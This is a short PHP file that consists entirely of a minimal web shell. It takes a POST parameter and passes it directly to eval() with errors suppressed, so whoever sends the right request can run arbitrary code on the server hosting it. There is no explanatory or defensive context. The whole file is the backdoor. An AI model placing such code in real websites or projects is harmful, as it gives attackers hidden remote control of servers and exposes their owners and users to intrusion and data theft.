<?php
if ($_POST['cmd']=="php_eval")
{
 $eval = $_POST['php_eval'];
 @eval($eval);
}
?>